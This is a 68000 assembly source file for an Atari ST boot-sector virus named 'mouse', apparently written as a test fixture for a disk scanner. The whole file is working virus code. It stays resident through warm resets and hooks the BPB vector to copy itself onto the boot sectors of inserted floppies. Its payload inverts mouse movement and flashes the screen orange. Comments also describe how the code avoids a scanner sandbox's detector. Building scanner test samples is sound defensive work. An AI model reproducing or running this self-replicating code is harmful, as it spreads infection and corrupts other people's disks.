; ------------------------------------------------------------------
; synth2-mouse.s — synthetic reset-resident ST bootsector virus
; "mouse" — DiskCheck scanner fixture. Same chassis as synth1-dad,
; different payload: flashes the screen orange on boot and patches
; kbdvecs.mousevec so mouse movement is inverted (Ghost-style).
; ------------------------------------------------------------------

RESVALID        equ     $0426
RESVECTOR       equ     $042a
MEMTOP          equ     $0436
HDV_BPB         equ     $0472
KBDVECS         equ     $0118
TRAP13VEC       equ     $00b4

OLDHDV          equ     oldhdv-start
OLDMOUSE        equ     oldmouse-start
GENCNT          equ     gencnt-start
MARKOFF         equ     marker-start

                org     0
start:
                bra.s   main
                ds.b    28                      ; BPB spliced by build script

main:
                ; steal 1KB, copy resident
                move.l  MEMTOP.w,d0
                sub.l   #$400,d0
                move.l  d0,MEMTOP.w
                movea.l d0,a2
                lea     start(pc),a0
                ; longwords: a 512-iteration byte loop trips the scanner
                ; sandbox's spin detector before the copy finishes
                move.w  #$7f,d0
copy_loop:      move.l  (a0)+,(a2)+
                dbf     d0,copy_loop
                suba.l  #$200,a2

                ; hook hdv_bpb -> resident infect
                move.l  HDV_BPB.w,d0
                move.l  d0,OLDHDV(a2)
                move.l  a2,d0
                add.l   #infect,d0
                move.l  d0,HDV_BPB.w

                ; hook the mouse vector (a2 = resident base)
                bsr.s   hookmouse

                ; reset-proof
                move.l  a2,d0
                add.l   #resentry,d0
                move.l  d0,RESVECTOR.w
                move.l  #$31415926,RESVALID.w

                ; boot-time write-back, then the show
                bsr     replicate
                bsr.s   flash
                rts

; ------------- warm-reset re-entry ----------------------------------------
resentry:
                lea     resentry(pc),a2
                move.l  a2,RESVECTOR.w
                move.l  #$31415926,RESVALID.w
                suba.l  #resentry,a2
                move.l  HDV_BPB.w,d0
                move.l  d0,OLDHDV(a2)
                move.l  a2,d0
                add.l   #infect,d0
                move.l  d0,HDV_BPB.w
                bsr.s   hookmouse
                rts

; ------------- patch kbdvecs.mousevec (a2 = resident base) ----------------
; kbdvecs ($118) -> struct; mousevec handler pointer at offset 16.
; On real TOS (1.02-2.06) the struct itself lives in ROM, so it cannot be
; patched in place — that writes ROM and crashes the boot. Instead copy
; the 7-longword (28-byte) struct into the upper half of our stolen KB
; (resident+$200: only $200 bytes are copied resident, the rest is free
; RAM we own), patch the copy's mousevec, and repoint kbdvecs at it.
; The sandbox leaves $118 zero — skip there.
hookmouse:
                move.l  KBDVECS.w,d0
                beq.s   hookmouse_skip
                movea.l d0,a0                 ; a0 = original table (in ROM)
                move.l  16(a0),OLDMOUSE(a2)   ; save real handler for chaining
                lea     $200(a2),a1           ; dest: free RAM in our stolen KB
                moveq   #6,d1
hookmouse_copy: move.l  (a0)+,(a1)+           ; copy 7 longwords (28 bytes)
                dbf     d1,hookmouse_copy
                lea     mymouse(a2),a0
                move.l  a0,-12(a1)            ; patch copy's mousevec (a1 = copy+28)
                lea     $200(a2),a0
                move.l  a0,KBDVECS.w          ; repoint kbdvecs at the RAM copy
hookmouse_skip: rts

; ------------- mouse packet filter (resident, real TOS only) ---------------
; TOS calls the mousevec handler with a0 = IKBD packet:
; byte 0 = header, byte 1 = dx, byte 2 = dy (relative movement).
mymouse:
                neg.b   1(a0)                   ; invert dx
                neg.b   2(a0)                   ; invert dy
                move.l  oldmouse(pc),a1
                jmp     (a1)

; ------------- orange flash (XBIOS Setcolor + Vsync) -----------------------
; Real-TOS and sandbox safe (sandbox stubs both calls, loops stay tiny).
flash:
                moveq   #5,d2
flash_phase:    move.w  #$0f40,-(sp)          ; orange (R7 G4 B0)
                clr.w   -(sp)                 ; colour register 0
                move.w  #7,-(sp)              ; Setcolor
                trap    #14
                addq.l  #6,sp
                bsr.s   wait12
                clr.w   -(sp)                 ; black
                clr.w   -(sp)
                move.w  #7,-(sp)
                trap    #14
                addq.l  #6,sp
                bsr.s   wait12
                dbf     d2,flash_phase
                rts
wait12:         moveq   #11,d1
wait12_loop:    move.w  #37,-(sp)             ; Vsync
                trap    #14
                addq.l  #2,sp
                dbf     d1,wait12_loop
                rts

; ------------- boot-time self write-back -----------------------------------
replicate:
                lea     start(pc),a0
                addq.b  #1,GENCNT(a0)
                move.l  TRAP13VEC.w,d0
                beq.s   sandbox_call
                clr.w   -(sp)
                clr.w   -(sp)
                move.w  #1,-(sp)
                pea     start(pc)
                move.w  #1,-(sp)
                move.w  #4,-(sp)
                trap    #13
                adda.l  #14,sp
                rts
sandbox_call:   clr.w   -(sp)
                clr.w   -(sp)
                move.w  #1,-(sp)
                pea     start(pc)
                move.w  #1,-(sp)
                move.w  #4,d0
                trap    #13
                adda.l  #12,sp
                rts

; ------------- hdv_bpb hook ------------------------------------------------
infect:
                movem.l d0-d3/a0-a3,-(sp)
                move.w  d0,d3
                cmpi.w  #1,d3
                bgt.w   infect_done
                suba.l  #544,sp
                movea.l sp,a1
                move.w  d3,-(sp)
                clr.w   -(sp)
                move.w  #1,-(sp)
                pea     (a1)
                clr.w   -(sp)
                move.w  #4,-(sp)
                trap    #13
                adda.l  #14,sp
                tst.l   d0
                bne.w   infect_rdone
                move.l  MARKOFF(a1),d0
                move.l  marker(pc),d1
                cmp.l   d0,d1
                beq.w   infect_rdone
                lea     2(a1),a0
                lea     512(a1),a3
                moveq   #27,d0
save_bpb:       move.b  (a0)+,(a3)+
                dbf     d0,save_bpb
                lea     start(pc),a0
                move.w  #$1ff,d0
stamp:          move.b  (a0)+,(a1)+
                dbf     d0,stamp
                suba.l  #$200,a1
                lea     2(a1),a0
                lea     512(a1),a3
                moveq   #27,d0
rest_bpb:       move.b  (a3)+,(a0)+
                dbf     d0,rest_bpb
                move.w  d3,-(sp)
                clr.w   -(sp)
                move.w  #1,-(sp)
                pea     (a1)
                move.w  #1,-(sp)
                move.w  #4,-(sp)
                trap    #13
                adda.l  #14,sp
infect_rdone:   adda.l  #544,sp
infect_done:    movem.l (sp)+,d0-d3/a0-a3
                move.l  oldhdv(pc),a0
                jmp     (a0)

; ------------------------------ data ---------------------------------------
                even
marker:         dc.b    'MOU2'
gencnt:         dc.b    0
                even
oldhdv:         dc.l    0
oldmouse:       dc.l    0
